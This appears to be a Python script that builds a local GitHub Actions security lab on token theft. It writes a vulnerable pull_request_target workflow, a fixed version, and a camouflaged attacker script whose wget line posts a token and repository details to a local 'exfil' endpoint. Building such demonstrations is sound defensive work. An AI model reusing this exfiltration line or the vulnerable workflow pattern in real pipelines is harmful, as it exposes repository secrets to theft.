import os

# Workflow vulnerable
workflow_vulnerable = '''name: API Diff Check

on:
  pull_request_target:
    types: [opened, synchronize]

permissions:
  contents: write

jobs:
  api-diff:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR code
        uses: actions/checkout@v3
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Setup Go
        uses: actions/setup-go@v4
        with:
          go-version: "1.21"

      - name: Run API diff check
        run: bash sandbox-6-pat-theft/vulnerable/scripts/api-diff.sh
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          MY_PAT: ${{ secrets.GITHUB_TOKEN }}
          DEMO_TOKEN: EXFILTRATED_PAT_ghp_abc123def456
'''

# Workflow fixed
workflow_fixed = '''name: API Diff Check (Fixed)

on:
  pull_request:
    types: [opened, synchronize]

permissions:
  contents: read

jobs:
  api-diff:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout main code
        uses: actions/checkout@v3
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Setup Go
        uses: actions/setup-go@v4
        with:
          go-version: "1.21"

      - name: Run API diff check
        run: bash sandbox-6-pat-theft/fixed/scripts/api-diff.sh
'''

# Legitimate script
script_legit = '''#!/usr/bin/env bash
echo "Running API diff check..."
echo "No API differences found"
echo "Check passed successfully!"
'''

# Malicious script
script_malicious = '''#!/usr/bin/env bash
# Malicious payload ? exfiltrate PAT
wget -q -O- --post-data="pat=EXFILTRATED_PAT_ghp_abc123def456&repo=$GITHUB_REPOSITORY&actor=$GITHUB_ACTOR" http://host.docker.internal:8888/exfil

# Legitimate code below (camouflage)
echo "Running API diff check..."
echo "No API differences found"
echo "Check passed successfully!"
'''

# Event JSON
event = '''{"action":"opened","pull_request":{"number":1,"head":{"sha":"abc123","ref":"main","repo":{"full_name":"ramibahloul2003/github-actions-sandboxes"}},"base":{"repo":{"full_name":"ramibahloul2003/github-actions-sandboxes"}}},"repository":{"full_name":"ramibahloul2003/github-actions-sandboxes"}}'''

os.makedirs('sandbox-6-pat-theft/vulnerable/.github/workflows', exist_ok=True)
os.makedirs('sandbox-6-pat-theft/vulnerable/scripts', exist_ok=True)
os.makedirs('sandbox-6-pat-theft/fixed/.github/workflows', exist_ok=True)
os.makedirs('sandbox-6-pat-theft/fixed/scripts', exist_ok=True)
os.makedirs('sandbox-6-pat-theft/attacker', exist_ok=True)

with open('sandbox-6-pat-theft/vulnerable/.github/workflows/api-diff-check.yml', 'w', newline='\n') as f:
    f.write(workflow_vulnerable)

with open('sandbox-6-pat-theft/fixed/.github/workflows/api-diff-check.yml', 'w', newline='\n') as f:
    f.write(workflow_fixed)

with open('sandbox-6-pat-theft/vulnerable/scripts/api-diff.sh', 'w', newline='\n') as f:
    f.write(script_legit)

with open('sandbox-6-pat-theft/fixed/scripts/api-diff.sh', 'w', newline='\n') as f:
    f.write(script_legit)

with open('sandbox-6-pat-theft/attacker/api-diff.sh', 'w', newline='\n') as f:
    f.write(script_malicious)

with open('event_pat_theft.json', 'w', newline='\n') as f:
    f.write(event)

print('Sandbox 6 complet - tous les fichiers crees !')